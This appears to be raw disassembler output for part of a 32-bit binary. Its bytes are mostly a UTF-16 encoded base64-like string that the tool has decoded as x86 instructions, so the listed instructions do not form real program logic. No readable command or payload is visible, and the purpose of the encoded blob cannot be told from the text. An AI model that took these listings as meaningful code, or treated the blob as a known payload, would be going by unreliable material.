  406d43:	4c                   	dec    %esp
  406d44:	00 71 00             	add    %dh,0x0(%ecx)
  406d47:	76 00                	jbe    0x406d49
  406d49:	55                   	push   %ebp
  406d4a:	00 51 00             	add    %dl,0x0(%ecx)
  406d4d:	44                   	inc    %esp
  406d4e:	00 61 00             	add    %ah,0x0(%ecx)
  406d51:	52                   	push   %edx
  406d52:	00 4b 00             	add    %cl,0x0(%ebx)
  406d55:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  406d59:	30 00                	xor    %al,(%eax)
  406d5b:	68 00 6f 00 76       	push   $0x76006f00
  406d60:	00 78 00             	add    %bh,0x0(%eax)
  406d63:	51                   	push   %ecx
  406d64:	00 56 00             	add    %dl,0x0(%esi)
  406d67:	31 00                	xor    %eax,(%eax)
  406d69:	66 00 47 00          	data16 add %al,0x0(%edi)
  406d6d:	4d                   	dec    %ebp
  406d6e:	00 2b                	add    %ch,(%ebx)
  406d70:	00 73 00             	add    %dh,0x0(%ebx)
  406d73:	4e                   	dec    %esi
  406d74:	00 77 00             	add    %dh,0x0(%edi)
  406d77:	75 00                	jne    0x406d79
  406d79:	68 00 71 00 6f       	push   $0x6f007100
  406d7e:	00 4f 00             	add    %cl,0x0(%edi)
  406d81:	79 00                	jns    0x406d83
  406d83:	78 00                	js     0x406d85
  406d85:	5a                   	pop    %edx
  406d86:	00 45 00             	add    %al,0x0(%ebp)
  406d89:	52                   	push   %edx
  406d8a:	00 68 00             	add    %ch,0x0(%eax)
  406d8d:	36 00 64 00 37       	add    %ah,%ss:0x37(%eax,%eax,1)
  406d92:	00 6d 00             	add    %ch,0x0(%ebp)
  406d95:	73 00                	jae    0x406d97
  406d97:	73 00                	jae    0x406d99
  406d99:	57                   	push   %edi
  406d9a:	00 45 00             	add    %al,0x0(%ebp)
  406d9d:	44                   	inc    %esp
  406d9e:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  406da2:	00 35 00 55 00 67    	add    %dh,0x67005500
  406da8:	00 68 00             	add    %ch,0x0(%eax)
  406dab:	77 00                	ja     0x406dad
  406dad:	31 00                	xor    %eax,(%eax)
  406daf:	71 00                	jno    0x406db1
  406db1:	76 00                	jbe    0x406db3
  406db3:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  406db7:	4b                   	dec    %ebx
  406db8:	00 30                	add    %dh,(%eax)
  406dba:	00 71 00             	add    %dh,0x0(%ecx)
  406dbd:	4e                   	dec    %esi
  406dbe:	00 55 00             	add    %dl,0x0(%ebp)
  406dc1:	61                   	popa
  406dc2:	00 47 00             	add    %al,0x0(%edi)
  406dc5:	62 00                	bound  %eax,(%eax)
  406dc7:	72 00                	jb     0x406dc9
  406dc9:	6c                   	insb   (%dx),%es:(%edi)
  406dca:	00 36                	add    %dh,(%esi)
  406dcc:	00 66 00             	add    %ah,0x0(%esi)
  406dcf:	53                   	push   %ebx
  406dd0:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  406dd4:	00 47 00             	add    %al,0x0(%edi)
  406dd7:	66 00 43 00          	data16 add %al,0x0(%ebx)
  406ddb:	4c                   	dec    %esp
  406ddc:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  406de0:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  406de4:	00 78 00             	add    %bh,0x0(%eax)
  406de7:	64 00 35 00 67 00 4c 	add    %dh,%fs:0x4c006700
  406dee:	00 57 00             	add    %dl,0x0(%edi)
  406df1:	34 00                	xor    $0x0,%al
  406df3:	32 00                	xor    (%eax),%al
  406df5:	35 00 6e 00 66       	xor    $0x66006e00,%eax
  406dfa:	00 69 00             	add    %ch,0x0(%ecx)
  406dfd:	56                   	push   %esi
  406dfe:	00 57 00             	add    %dl,0x0(%edi)
  406e01:	72 00                	jb     0x406e03
  406e03:	4b                   	dec    %ebx
  406e04:	00 77 00             	add    %dh,0x0(%edi)
  406e07:	38 00                	cmp    %al,(%eax)
  406e09:	34 00                	xor    $0x0,%al
  406e0b:	4a                   	dec    %edx
  406e0c:	00 6f 00             	add    %ch,0x0(%edi)
  406e0f:	74 00                	je     0x406e11
  406e11:	31 00                	xor    %eax,(%eax)
  406e13:	70 00                	jo     0x406e15
  406e15:	4c                   	dec    %esp
  406e16:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  406e1a:	00 7a 00             	add    %bh,0x0(%edx)
  406e1d:	6d                   	insl   (%dx),%es:(%edi)
  406e1e:	00 69 00             	add    %ch,0x0(%ecx)
  406e21:	4c                   	dec    %esp
  406e22:	00 4a 00             	add    %cl,0x0(%edx)
  406e25:	53                   	push   %ebx
  406e26:	00 49 00             	add    %cl,0x0(%ecx)
  406e29:	4c                   	dec    %esp
  406e2a:	00 36                	add    %dh,(%esi)
  406e2c:	00 49 00             	add    %cl,0x0(%ecx)
  406e2f:	6a 00                	push   $0x0
  406e31:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  406e35:	56                   	push   %esi
  406e36:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  406e3a:	00 4b 00             	add    %cl,0x0(%ebx)
  406e3d:	63 00                	arpl   %eax,(%eax)
  406e3f:	6b 00 59             	imul   $0x59,(%eax),%eax
  406e42:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  406e46:	00 4f 00             	add    %cl,0x0(%edi)
  406e49:	6f                   	outsl  %ds:(%esi),(%dx)
  406e4a:	00 61 00             	add    %ah,0x0(%ecx)
  406e4d:	68 00 64 00 54       	push   $0x54006400
  406e52:	00 53 00             	add    %dl,0x0(%ebx)
  406e55:	70 00                	jo     0x406e57
  406e57:	6c                   	insb   (%dx),%es:(%edi)
  406e58:	00 70 00             	add    %dh,0x0(%eax)
  406e5b:	69 00 57 00 6e 00    	imul   $0x6e0057,(%eax),%eax
  406e61:	31 00                	xor    %eax,(%eax)
  406e63:	53                   	push   %ebx
  406e64:	00 32                	add    %dh,(%edx)
  406e66:	00 56 00             	add    %dl,0x0(%esi)
  406e69:	43                   	inc    %ebx
  406e6a:	00 75 00             	add    %dh,0x0(%ebp)
  406e6d:	32 00                	xor    (%eax),%al
  406e6f:	48                   	dec    %eax
  406e70:	00 59 00             	add    %bl,0x0(%ecx)
  406e73:	4d                   	dec    %ebp
  406e74:	00 69 00             	add    %ch,0x0(%ecx)
  406e77:	52                   	push   %edx
  406e78:	00 4d 00             	add    %cl,0x0(%ebp)
  406e7b:	4d                   	dec    %ebp
  406e7c:	00 48 00             	add    %cl,0x0(%eax)
  406e7f:	30 00                	xor    %al,(%eax)
  406e81:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406e85:	71 00                	jno    0x406e87
  406e87:	6c                   	insb   (%dx),%es:(%edi)
  406e88:	00 55 00             	add    %dl,0x0(%ebp)
  406e8b:	70 00                	jo     0x406e8d
  406e8d:	32 00                	xor    (%eax),%al
  406e8f:	58                   	pop    %eax
  406e90:	00 46 00             	add    %al,0x0(%esi)
  406e93:	4c                   	dec    %esp
  406e94:	00 6d 00             	add    %ch,0x0(%ebp)
  406e97:	44                   	inc    %esp
  406e98:	00 37                	add    %dh,(%edi)
  406e9a:	00 72 00             	add    %dh,0x0(%edx)
  406e9d:	42                   	inc    %edx
  406e9e:	00 61 00             	add    %ah,0x0(%ecx)
  406ea1:	7a 00                	jp     0x406ea3
  406ea3:	4c                   	dec    %esp
  406ea4:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  406ea8:	00 63 00             	add    %ah,0x0(%ebx)
  406eab:	52                   	push   %edx
  406eac:	00 6e 00             	add    %ch,0x0(%esi)
  406eaf:	43                   	inc    %ebx
  406eb0:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  406eb4:	00 2f                	add    %ch,(%edi)
  406eb6:	00 46 00             	add    %al,0x0(%esi)
  406eb9:	50                   	push   %eax
  406eba:	00 4a 00             	add    %cl,0x0(%edx)
  406ebd:	73 00                	jae    0x406ebf
  406ebf:	61                   	popa
  406ec0:	00 6f 00             	add    %ch,0x0(%edi)
  406ec3:	77 00                	ja     0x406ec5
  406ec5:	53                   	push   %ebx
  406ec6:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  406eca:	00 73 00             	add    %dh,0x0(%ebx)
  406ecd:	46                   	inc    %esi
  406ece:	00 63 00             	add    %ah,0x0(%ebx)
  406ed1:	6d                   	insl   (%dx),%es:(%edi)
  406ed2:	00 58 00             	add    %bl,0x0(%eax)
  406ed5:	76 00                	jbe    0x406ed7
  406ed7:	53                   	push   %ebx
  406ed8:	00 42 00             	add    %al,0x0(%edx)
  406edb:	61                   	popa
  406edc:	00 6a 00             	add    %ch,0x0(%edx)
  406edf:	4a                   	dec    %edx
  406ee0:	00 48 00             	add    %cl,0x0(%eax)
  406ee3:	55                   	push   %ebp
  406ee4:	00 65 00             	add    %ah,0x0(%ebp)
  406ee7:	6f                   	outsl  %ds:(%esi),(%dx)
  406ee8:	00 32                	add    %dh,(%edx)
  406eea:	00 70 00             	add    %dh,0x0(%eax)
  406eed:	62 00                	bound  %eax,(%eax)
  406eef:	62 00                	bound  %eax,(%eax)
  406ef1:	6b 00 55             	imul   $0x55,(%eax),%eax
  406ef4:	00 53 00             	add    %dl,0x0(%ebx)
  406ef7:	6c                   	insb   (%dx),%es:(%edi)
  406ef8:	00 65 00             	add    %ah,0x0(%ebp)
  406efb:	44                   	inc    %esp
  406efc:	00 2f                	add    %ch,(%edi)
  406efe:	00 72 00             	add    %dh,0x0(%edx)
  406f01:	44                   	inc    %esp
  406f02:	00 58 00             	add    %bl,0x0(%eax)
  406f05:	43                   	inc    %ebx
  406f06:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  406f0a:	00 56 00             	add    %dl,0x0(%esi)
  406f0d:	34 00                	xor    $0x0,%al
  406f0f:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  406f13:	66 00 56 00          	data16 add %dl,0x0(%esi)
  406f17:	55                   	push   %ebp
  406f18:	00 43 00             	add    %al,0x0(%ebx)
  406f1b:	6c                   	insb   (%dx),%es:(%edi)
  406f1c:	00 67 00             	add    %ah,0x0(%edi)
  406f1f:	54                   	push   %esp
  406f20:	00 35 00 6a 00 33    	add    %dh,0x33006a00
  406f26:	00 65 00             	add    %ah,0x0(%ebp)
  406f29:	46                   	inc    %esi
  406f2a:	00 4d 00             	add    %cl,0x0(%ebp)
  406f2d:	46                   	inc    %esi
  406f2e:	00 32                	add    %dh,(%edx)
  406f30:	00 6f 00             	add    %ch,0x0(%edi)
  406f33:	42                   	inc    %edx
  406f34:	00 76 00             	add    %dh,0x0(%esi)
  406f37:	48                   	dec    %eax
  406f38:	00 49 00             	add    %cl,0x0(%ecx)
  406f3b:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  406f3f:	59                   	pop    %ecx
  406f40:	00 4a 00             	add    %cl,0x0(%edx)
  406f43:	6e                   	outsb  %ds:(%esi),(%dx)
  406f44:	00 6a 00             	add    %ch,0x0(%edx)
  406f47:	2f                   	das
  406f48:	00 36                	add    %dh,(%esi)
  406f4a:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  406f4e:	00 37                	add    %dh,(%edi)
  406f50:	00 36                	add    %dh,(%esi)
  406f52:	00 68 00             	add    %ch,0x0(%eax)
  406f55:	47                   	inc    %edi
  406f56:	00 51 00             	add    %dl,0x0(%ecx)
  406f59:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  406f5d:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  406f61:	4b                   	dec    %ebx
  406f62:	00 63 00             	add    %ah,0x0(%ebx)
  406f65:	38 00                	cmp    %al,(%eax)
  406f67:	35 00 66 00 45       	xor    $0x45006600,%eax
  406f6c:	00 57 00             	add    %dl,0x0(%edi)
  406f6f:	75 00                	jne    0x406f71
  406f71:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  406f75:	75 00                	jne    0x406f77
  406f77:	66 00 68 00          	data16 add %ch,0x0(%eax)
  406f7b:	57                   	push   %edi
  406f7c:	00 34 00             	add    %dh,(%eax,%eax,1)
  406f7f:	78 00                	js     0x406f81
  406f81:	68 00 37 00 34       	push   $0x34003700
  406f86:	00 5a 00             	add    %bl,0x0(%edx)
  406f89:	4d                   	dec    %ebp
  406f8a:	00 45 00             	add    %al,0x0(%ebp)
  406f8d:	39 00                	cmp    %eax,(%eax)
  406f8f:	41                   	inc    %ecx
  406f90:	00 4b 00             	add    %cl,0x0(%ebx)
  406f93:	45                   	inc    %ebp
  406f94:	00 32                	add    %dh,(%edx)
  406f96:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  406f9a:	00 55 00             	add    %dl,0x0(%ebp)
  406f9d:	55                   	push   %ebp
  406f9e:	00 76 00             	add    %dh,0x0(%esi)
  406fa1:	5a                   	pop    %edx
  406fa2:	00 43 00             	add    %al,0x0(%ebx)
  406fa5:	38 00                	cmp    %al,(%eax)
  406fa7:	2b 00                	sub    (%eax),%eax
  406fa9:	6e                   	outsb  %ds:(%esi),(%dx)
  406faa:	00 78 00             	add    %bh,0x0(%eax)
  406fad:	39 00                	cmp    %eax,(%eax)
  406faf:	77 00                	ja     0x406fb1
  406fb1:	70 00                	jo     0x406fb3
  406fb3:	4a                   	dec    %edx
  406fb4:	00 78 00             	add    %bh,0x0(%eax)
  406fb7:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  406fbb:	48                   	dec    %eax
  406fbc:	00 79 00             	add    %bh,0x0(%ecx)
  406fbf:	52                   	push   %edx
  406fc0:	00 6e 00             	add    %ch,0x0(%esi)
  406fc3:	6e                   	outsb  %ds:(%esi),(%dx)
  406fc4:	00 50 00             	add    %dl,0x0(%eax)
  406fc7:	42                   	inc    %edx
  406fc8:	00 55 00             	add    %dl,0x0(%ebp)
  406fcb:	68 00 68 00 41       	push   $0x41006800
  406fd0:	00 50 00             	add    %dl,0x0(%eax)
  406fd3:	38 00                	cmp    %al,(%eax)
  406fd5:	67 00 74 00          	add    %dh,0x0(%si)
  406fd9:	4e                   	dec    %esi
  406fda:	00 30                	add    %dh,(%eax)
  406fdc:	00 78 00             	add    %bh,0x0(%eax)
  406fdf:	52                   	push   %edx
  406fe0:	00 4b 00             	add    %cl,0x0(%ebx)
  406fe3:	42                   	inc    %edx
  406fe4:	00 70 00             	add    %dh,0x0(%eax)
  406fe7:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  406feb:	6a 00                	push   $0x0
  406fed:	58                   	pop    %eax
  406fee:	00 51 00             	add    %dl,0x0(%ecx)
  406ff1:	6e                   	outsb  %ds:(%esi),(%dx)
  406ff2:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  406ff6:	00 52 00             	add    %dl,0x0(%edx)
  406ff9:	56                   	push   %esi
  406ffa:	00 77 00             	add    %dh,0x0(%edi)
  406ffd:	70 00                	jo     0x406fff
  406fff:	2b 00                	sub    (%eax),%eax
  407001:	45                   	inc    %ebp
  407002:	00 61 00             	add    %ah,0x0(%ecx)
  407005:	6d                   	insl   (%dx),%es:(%edi)
  407006:	00 38                	add    %bh,(%eax)
  407008:	00 73 00             	add    %dh,0x0(%ebx)
  40700b:	4e                   	dec    %esi
  40700c:	00 2f                	add    %ch,(%edi)
  40700e:	00 32                	add    %dh,(%edx)
  407010:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  407014:	00 79 00             	add    %bh,0x0(%ecx)
  407017:	62 00                	bound  %eax,(%eax)
  407019:	72 00                	jb     0x40701b
  40701b:	75 00                	jne    0x40701d
  40701d:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  407021:	47                   	inc    %edi
  407022:	00 53 00             	add    %dl,0x0(%ebx)
  407025:	31 00                	xor    %eax,(%eax)
  407027:	75 00                	jne    0x407029
  407029:	69 00 71 00 33 00    	imul   $0x330071,(%eax),%eax
  40702f:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  407033:	43                   	inc    %ebx
  407034:	00 79 00             	add    %bh,0x0(%ecx)
  407037:	4d                   	dec    %ebp
  407038:	00 63 00             	add    %ah,0x0(%ebx)
  40703b:	6f                   	outsl  %ds:(%esi),(%dx)
  40703c:	00 2f                	add    %ch,(%edi)
  40703e:	00 34 00             	add    %dh,(%eax,%eax,1)
  407041:	71 00                	jno    0x407043
  407043:	67 00 46 00          	add    %al,0x0(%bp)
  407047:	75 00                	jne    0x407049
  407049:	77 00                	ja     0x40704b
  40704b:	4e                   	dec    %esi
  40704c:	00 45 00             	add    %al,0x0(%ebp)
  40704f:	65 00 4c 00 57       	add    %cl,%gs:0x57(%eax,%eax,1)
  407054:	00 59 00             	add    %bl,0x0(%ecx)
  407057:	34 00                	xor    $0x0,%al
  407059:	79 00                	jns    0x40705b
  40705b:	6f                   	outsl  %ds:(%esi),(%dx)
  40705c:	00 48 00             	add    %cl,0x0(%eax)
  40705f:	33 00                	xor    (%eax),%eax
  407061:	55                   	push   %ebp
  407062:	00 51 00             	add    %dl,0x0(%ecx)
  407065:	31 00                	xor    %eax,(%eax)
  407067:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40706b:	56                   	push   %esi
  40706c:	00 65 00             	add    %ah,0x0(%ebp)
  40706f:	53                   	push   %ebx
  407070:	00 7a 00             	add    %bh,0x0(%edx)
  407073:	51                   	push   %ecx
  407074:	00 61 00             	add    %ah,0x0(%ecx)
  407077:	61                   	popa
  407078:	00 6a 00             	add    %ch,0x0(%edx)
  40707b:	47                   	inc    %edi
  40707c:	00 75 00             	add    %dh,0x0(%ebp)
  40707f:	4f                   	dec    %edi
  407080:	00 6d 00             	add    %ch,0x0(%ebp)
  407083:	49                   	dec    %ecx
  407084:	00 5a 00             	add    %bl,0x0(%edx)
  407087:	67 00 36 00 4b       	add    %dh,0x4b00
  40708c:	00 49 00             	add    %cl,0x0(%ecx)
  40708f:	79 00                	jns    0x407091
  407091:	49                   	dec    %ecx
  407092:	00 6d 00             	add    %ch,0x0(%ebp)
  407095:	35 00 4e 00 61       	xor    $0x61004e00,%eax
  40709a:	00 49 00             	add    %cl,0x0(%ecx)
  40709d:	42                   	inc    %edx
  40709e:	00 6e 00             	add    %ch,0x0(%esi)
  4070a1:	78 00                	js     0x4070a3
  4070a3:	33 00                	xor    (%eax),%eax
  4070a5:	64 00 36             	add    %dh,%fs:(%esi)
  4070a8:	00 6b 00             	add    %ch,0x0(%ebx)
  4070ab:	52                   	push   %edx
  4070ac:	00 41 00             	add    %al,0x0(%ecx)
  4070af:	39 00                	cmp    %eax,(%eax)
  4070b1:	2b 00                	sub    (%eax),%eax
  4070b3:	68 00 69 00 6e       	push   $0x6e006900
  4070b8:	00 79 00             	add    %bh,0x0(%ecx)
  4070bb:	4c                   	dec    %esp
  4070bc:	00 72 00             	add    %dh,0x0(%edx)
  4070bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4070c0:	00 2f                	add    %ch,(%edi)
  4070c2:	00 58 00             	add    %bl,0x0(%eax)
  4070c5:	44                   	inc    %esp
  4070c6:	00 35 00 4d 00 76    	add    %dh,0x76004d00
  4070cc:	00 6a 00             	add    %ch,0x0(%edx)
  4070cf:	55                   	push   %ebp
  4070d0:	00 78 00             	add    %bh,0x0(%eax)
  4070d3:	4a                   	dec    %edx
  4070d4:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  4070d8:	00 78 00             	add    %bh,0x0(%eax)
  4070db:	50                   	push   %eax
  4070dc:	00 68 00             	add    %ch,0x0(%eax)
  4070df:	48                   	dec    %eax
  4070e0:	00 68 00             	add    %ch,0x0(%eax)
  4070e3:	2f                   	das
  4070e4:	00 56 00             	add    %dl,0x0(%esi)
  4070e7:	33 00                	xor    (%eax),%eax
  4070e9:	61                   	popa
  4070ea:	00 77 00             	add    %dh,0x0(%edi)
  4070ed:	43                   	inc    %ebx
  4070ee:	00 67 00             	add    %ah,0x0(%edi)
  4070f1:	62 00                	bound  %eax,(%eax)
  4070f3:	33 00                	xor    (%eax),%eax
  4070f5:	50                   	push   %eax
  4070f6:	00 42 00             	add    %al,0x0(%edx)
  4070f9:	4c                   	dec    %esp
  4070fa:	00 6d 00             	add    %ch,0x0(%ebp)
  4070fd:	49                   	dec    %ecx
  4070fe:	00 65 00             	add    %ah,0x0(%ebp)
  407101:	4c                   	dec    %esp
  407102:	00 75 00             	add    %dh,0x0(%ebp)
  407105:	57                   	push   %edi
  407106:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40710a:	00 79 00             	add    %bh,0x0(%ecx)
  40710d:	47                   	inc    %edi
  40710e:	00 6d 00             	add    %ch,0x0(%ebp)
  407111:	47                   	inc    %edi
  407112:	00 69 00             	add    %ch,0x0(%ecx)
  407115:	74 00                	je     0x407117
  407117:	79 00                	jns    0x407119
  407119:	50                   	push   %eax
  40711a:	00 30                	add    %dh,(%eax)
  40711c:	00 6e 00             	add    %ch,0x0(%esi)
  40711f:	45                   	inc    %ebp
  407120:	00 34 00             	add    %dh,(%eax,%eax,1)
  407123:	72 00                	jb     0x407125
  407125:	6f                   	outsl  %ds:(%esi),(%dx)
  407126:	00 6f 00             	add    %ch,0x0(%edi)
  407129:	7a 00                	jp     0x40712b
  40712b:	32 00                	xor    (%eax),%al
  40712d:	4d                   	dec    %ebp
  40712e:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  407132:	00 2b                	add    %ch,(%ebx)
  407134:	00 78 00             	add    %bh,0x0(%eax)
  407137:	70 00                	jo     0x407139
  407139:	2b 00                	sub    (%eax),%eax
  40713b:	73 00                	jae    0x40713d
  40713d:	70 00                	jo     0x40713f
  40713f:	4d                   	dec    %ebp
  407140:	00 66 00             	add    %ah,0x0(%esi)
  407143:	4e                   	dec    %esi
  407144:	00 68 00             	add    %ch,0x0(%eax)
  407147:	75 00                	jne    0x407149
  407149:	79 00                	jns    0x40714b
  40714b:	2f                   	das
  40714c:	00 61 00             	add    %ah,0x0(%ecx)
  40714f:	74 00                	je     0x407151
  407151:	67 00 43 00          	add    %al,0x0(%bp,%di)
  407155:	74 00                	je     0x407157
  407157:	68 00 6a 00 78       	push   $0x78006a00
  40715c:	00 73 00             	add    %dh,0x0(%ebx)
  40715f:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  407163:	56                   	push   %esi
  407164:	00 49 00             	add    %cl,0x0(%ecx)
  407167:	42                   	inc    %edx
  407168:	00 6e 00             	add    %ch,0x0(%esi)
  40716b:	79 00                	jns    0x40716d
  40716d:	37                   	aaa
  40716e:	00 48 00             	add    %cl,0x0(%eax)
  407171:	79 00                	jns    0x407173
  407173:	49                   	dec    %ecx
  407174:	00 45 00             	add    %al,0x0(%ebp)
  407177:	4b                   	dec    %ebx
  407178:	00 66 00             	add    %ah,0x0(%esi)
  40717b:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40717f:	33 00                	xor    (%eax),%eax
  407181:	72 00                	jb     0x407183
  407183:	59                   	pop    %ecx
  407184:	00 70 00             	add    %dh,0x0(%eax)
  407187:	4e                   	dec    %esi
  407188:	00 70 00             	add    %dh,0x0(%eax)
  40718b:	34 00                	xor    $0x0,%al
  40718d:	54                   	push   %esp
  40718e:	00 75 00             	add    %dh,0x0(%ebp)
  407191:	69 00 6f 00 6c 00    	imul   $0x6c006f,(%eax),%eax
  407197:	4a                   	dec    %edx
  407198:	00 77 00             	add    %dh,0x0(%edi)
  40719b:	37                   	aaa
  40719c:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  4071a0:	00 58 00             	add    %bl,0x0(%eax)
  4071a3:	4e                   	dec    %esi
  4071a4:	00 76 00             	add    %dh,0x0(%esi)
  4071a7:	2b 00                	sub    (%eax),%eax
  4071a9:	4e                   	dec    %esi
  4071aa:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  4071ae:	00 46 00             	add    %al,0x0(%esi)
  4071b1:	54                   	push   %esp
  4071b2:	00 62 00             	add    %ah,0x0(%edx)
  4071b5:	55                   	push   %ebp
  4071b6:	00 71 00             	add    %dh,0x0(%ecx)
  4071b9:	4d                   	dec    %ebp
  4071ba:	00 46 00             	add    %al,0x0(%esi)
  4071bd:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  4071c1:	55                   	push   %ebp
  4071c2:	00 30                	add    %dh,(%eax)
  4071c4:	00 36                	add    %dh,(%esi)
  4071c6:	00 77 00             	add    %dh,0x0(%edi)
  4071c9:	42                   	inc    %edx
  4071ca:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  4071ce:	00 41 00             	add    %al,0x0(%ecx)
  4071d1:	37                   	aaa
  4071d2:	00 76 00             	add    %dh,0x0(%esi)
  4071d5:	44                   	inc    %esp
  4071d6:	00 73 00             	add    %dh,0x0(%ebx)
  4071d9:	4e                   	dec    %esi
  4071da:	00 68 00             	add    %ch,0x0(%eax)
  4071dd:	76 00                	jbe    0x4071df
  4071df:	38 00                	cmp    %al,(%eax)
  4071e1:	47                   	inc    %edi
  4071e2:	00 31                	add    %dh,(%ecx)
  4071e4:	00 78 00             	add    %bh,0x0(%eax)
  4071e7:	47                   	inc    %edi
  4071e8:	00 4e 00             	add    %cl,0x0(%esi)
  4071eb:	30 00                	xor    %al,(%eax)
  4071ed:	6c                   	insb   (%dx),%es:(%edi)
  4071ee:	00 31                	add    %dh,(%ecx)
  4071f0:	00 38                	add    %bh,(%eax)
  4071f2:	00 77 00             	add    %dh,0x0(%edi)
  4071f5:	68 00 79 00 51       	push   $0x51007900
  4071fa:	00 6a 00             	add    %ch,0x0(%edx)
  4071fd:	31 00                	xor    %eax,(%eax)
  4071ff:	74 00                	je     0x407201
  407201:	69 00 53 00 50 00    	imul   $0x500053,(%eax),%eax
  407207:	49                   	dec    %ecx
  407208:	00 68 00             	add    %ch,0x0(%eax)
  40720b:	78 00                	js     0x40720d
  40720d:	64 00 32             	add    %dh,%fs:(%edx)
  407210:	00 48 00             	add    %cl,0x0(%eax)
  407213:	57                   	push   %edi
  407214:	00 48 00             	add    %cl,0x0(%eax)
  407217:	55                   	push   %ebp
  407218:	00 58 00             	add    %bl,0x0(%eax)
  40721b:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40721f:	4a                   	dec    %edx
  407220:	00 7a 00             	add    %bh,0x0(%edx)
  407223:	38 00                	cmp    %al,(%eax)
  407225:	75 00                	jne    0x407227
  407227:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40722b:	75 00                	jne    0x40722d
  40722d:	76 00                	jbe    0x40722f
  40722f:	33 00                	xor    (%eax),%eax
  407231:	33 00                	xor    (%eax),%eax
  407233:	2b 00                	sub    (%eax),%eax
  407235:	4f                   	dec    %edi
  407236:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  40723a:	00 32                	add    %dh,(%edx)
  40723c:	00 6d 00             	add    %ch,0x0(%ebp)
  40723f:	63 00                	arpl   %eax,(%eax)
  407241:	59                   	pop    %ecx
  407242:	00 71 00             	add    %dh,0x0(%ecx)
  407245:	59                   	pop    %ecx
  407246:	00 73 00             	add    %dh,0x0(%ebx)
  407249:	53                   	push   %ebx
  40724a:	00 42 00             	add    %al,0x0(%edx)
  40724d:	63 00                	arpl   %eax,(%eax)
  40724f:	4f                   	dec    %edi
  407250:	00 51 00             	add    %dl,0x0(%ecx)
  407253:	6d                   	insl   (%dx),%es:(%edi)
  407254:	00 70 00             	add    %dh,0x0(%eax)
  407257:	58                   	pop    %eax
  407258:	00 6f 00             	add    %ch,0x0(%edi)
  40725b:	4f                   	dec    %edi
  40725c:	00 79 00             	add    %bh,0x0(%ecx)
  40725f:	78 00                	js     0x407261
  407261:	53                   	push   %ebx
  407262:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  407266:	00 32                	add    %dh,(%edx)
  407268:	00 32                	add    %dh,(%edx)
  40726a:	00 71 00             	add    %dh,0x0(%ecx)
  40726d:	51                   	push   %ecx
  40726e:	00 66 00             	add    %ah,0x0(%esi)
  407271:	32 00                	xor    (%eax),%al
  407273:	57                   	push   %edi
  407274:	00 50 00             	add    %dl,0x0(%eax)
  407277:	57                   	push   %edi
  407278:	00 6b 00             	add    %ch,0x0(%ebx)
  40727b:	46                   	inc    %esi
  40727c:	00 37                	add    %dh,(%edi)
  40727e:	00 6e 00             	add    %ch,0x0(%esi)
  407281:	68 00 30 00 6d       	push   $0x6d003000
  407286:	00 70 00             	add    %dh,0x0(%eax)
  407289:	44                   	inc    %esp
  40728a:	00 71 00             	add    %dh,0x0(%ecx)
  40728d:	4b                   	dec    %ebx
  40728e:	00 61 00             	add    %ah,0x0(%ecx)
  407291:	56                   	push   %esi
  407292:	00 30                	add    %dh,(%eax)
  407294:	00 6e 00             	add    %ch,0x0(%esi)
  407297:	41                   	inc    %ecx
  407298:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40729c:	00 38                	add    %bh,(%eax)
  40729e:	00 62 00             	add    %ah,0x0(%edx)
  4072a1:	64 00 64 00 41       	add    %ah,%fs:0x41(%eax,%eax,1)
  4072a6:	00 42 00             	add    %al,0x0(%edx)
  4072a9:	75 00                	jne    0x4072ab
  4072ab:	34 00                	xor    $0x0,%al
  4072ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4072ae:	00 56 00             	add    %dl,0x0(%esi)
  4072b1:	78 00                	js     0x4072b3
  4072b3:	47                   	inc    %edi
  4072b4:	00 68 00             	add    %ch,0x0(%eax)
  4072b7:	52                   	push   %edx
  4072b8:	00 4a 00             	add    %cl,0x0(%edx)
  4072bb:	72 00                	jb     0x4072bd
  4072bd:	35 00 4d 00 70       	xor    $0x70004d00,%eax
  4072c2:	00 67 00             	add    %ah,0x0(%edi)
  4072c5:	30 00                	xor    %al,(%eax)
